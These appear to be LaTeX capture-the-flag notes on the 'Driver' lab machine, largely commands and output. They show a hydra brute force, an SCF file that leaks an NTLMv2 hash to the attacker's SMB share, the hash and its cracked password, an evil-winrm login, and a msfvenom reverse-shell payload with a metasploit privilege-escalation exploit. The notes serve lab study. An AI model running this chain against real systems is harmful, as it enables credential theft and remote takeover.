\chapter{Driver}
\begin{itemize}
    \item {\bf technics}: \gls{t:printnightmare}, \gls{t:smb-mitm}
    \item {\bf Components}: http, smb 
    \item {\bf tools}: rpcdump, metasploit, ffuf, hydra, responder
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Discovery}

\subsubsection{nmap}
\begin{verbatim}
$ sudo nmap -sV -sC 10.10.11.106
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-12 14:10 CEST
Nmap scan report for 10.10.11.106
Host is up (0.085s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2022-09-12T19:11:07
|_  start_date: 2022-09-12T19:09:52
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

\end{verbatim}
\subsubsection{smb}
\begin{verbatim}
$ enum4linux-ng -A 10.10.11.106i -u anonymous -p anonymous

 ===========================================================
|    Domain Information via SMB session for 10.10.11.106    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DRIVER
NetBIOS domain name: ''
DNS domain: DRIVER
FQDN: DRIVER
Derived membership: workgroup member
Derived domain: unknown
\end{verbatim}

\subsubsection{HTTP}

on a une basic auth

\begin{verbatim}
$ python ~/pentesting-tools/web/httpmethods/httpmethods.py http://10.10.11.106


  Method            Length   Status code   Reason
  BAMBOOZLE         1293     405           Method Not Allowed
  CHECKIN           1293     405           Method Not Allowed
  CHECKOUT          1293     405           Method Not Allowed
  CONNECT           1293     405           Method Not Allowed
  COPY              1293     405           Method Not Allowed
  DELETE            1293     405           Method Not Allowed
  GET               20       401           Unauthorized
  HEAD              0        401           Unauthorized
  INDEX             1293     405           Method Not Allowed
  LINK              1293     405           Method Not Allowed
  LOCK              1293     405           Method Not Allowed
  MKCOL             1293     405           Method Not Allowed
  MOVE              1293     405           Method Not Allowed
  NOEXISTE          1293     405           Method Not Allowed
  OPTIONS           0        200           OK
  ORDERPATCH        1293     405           Method Not Allowed
  PATCH             1293     405           Method Not Allowed
  POST              20       401           Unauthorized
  PROPFIND          1293     405           Method Not Allowed
  PROPPATCH         1293     405           Method Not Allowed
  PUT               1293     405           Method Not Allowed
  REPORT            1293     405           Method Not Allowed
  SEARCH            1293     405           Method Not Allowed
  SHOWMETHOD        1293     405           Method Not Allowed
  SPACEJUMP         1293     405           Method Not Allowed
  TEXTSEARCH        1293     405           Method Not Allowed
  TRACE             1508     501           Not Implemented
  TRACK             1293     405           Method Not Allowed
  UNCHECKOUT        1293     405           Method Not Allowed
  UNLINK            1293     405           Method Not Allowed
  UNLOCK            1293     405           Method Not Allowed
  VERSION-CONTROL   1293     405           Method Not Allowed
\end{verbatim}

bruteforce:
\begin{verbatim}
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
    -e nsr -s 80 -f 10.10.11.106 http-get /

[80][http-get] host: 10.10.11.106   login: admin   password: admin
\end{verbatim}

techno PHP

file upload

on peut upload un php 
\begin{verbatim}
http://10.10.11.106/fw_up.php?msg=SUCCESS

ffuf -u http://10.10.11.106/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ
RIEN

ffuf -u http://10.10.11.106/fw_up.php?FUZZ=TEST -w ./test.txt:FUZZ \
    -H 'Authorization: Basic YWRtaW46YWRtaW4='
RIEN
\end{verbatim}

try to upload a scf file:
\begin{verbatim}
[Shell]
Command=2
IconFile=\\10.10.16.3\toto.ico
[Taskbar]
Command=ToggleDesktop
\end{verbatim}

\begin{verbatim}
[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:cedd328b90457ec7:3628E3C2C874A4C16390A167B8F87BC0:0101000000000000801D1E95C7C6D801214A94392D82C8430000000002000800450031005500520001001E00570049004E002D0053004100410056004C0058003800580057004300370004003400570049004E002D0053004100410056004C005800380058005700430037002E0045003100550052002E004C004F00430041004C000300140045003100550052002E004C004F00430041004C000500140045003100550052002E004C004F00430041004C0007000800801D1E95C7C6D80106000400020000000800300030000000000000000000000000200000341B99C07FF6922681FE6B99203023E1D8C11A5223CAB00AF624A93556CF25190A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003300000000000000000000000000
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony

hashcat -m 5600 tony.hash /usr/share/wordlists/passwords/rockyou.txt
TONY::DRIVER:cedd328b90457ec7:3628e3c2c874a4c16390a167b8f87bc0:0101000000000000801d1e95c7c6d801214a94392d82c8430000000002000800450031005500520001001e00570049004e002d0053004100410056004c0058003800580057004300370004003400570049004e002d0053004100410056004c005800380058005700430037002e0045003100550052002e004c004f00430041004c000300140045003100550052002e004c004f00430041004c000500140045003100550052002e004c004f00430041004c0007000800801d1e95c7c6d80106000400020000000800300030000000000000000000000000200000341b99c07ff6922681fe6b99203023e1d8c11a5223cab00af624a93556cf25190a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003300000000000000000000000000:liltony
\end{verbatim}

\subsection{Foothold}
\subsubsection{Winrm}

\begin{verbatim}
$ evil-winrm -i 10.10.11.106 -u tony -p liltony

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents>upload /tmp/windows-privesc-check2.exe
\end{verbatim}

\subsection{Alternative PrivEsc}

confirm that it's printnightmare

\begin{verbatim}
$ rpcdump.py 10.10.11.106 |egrep 'MS-RPRN|MS-PAR'egrep: warning: egrep is obsolescent; using grep -E
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol
\end{verbatim}

\subsection{Metasploit}

craft a meterpreter and use \verb+multi/recon/local_exploit_suggester+
\begin{verbatim}
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.10.16.3 LPORT=4444 -f exe > shell.exe

msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost tun0
set lport 4444
run

migrate to a x64 process that has a session to 1 (interactive session)

background session then
use exploit/windows/local/ricoh_driver_privesc
set payload windows/x64/meterpreter/reverse_tcp
set session 1
set lhost tun0
run
\end{verbatim}

\section{Theorie}


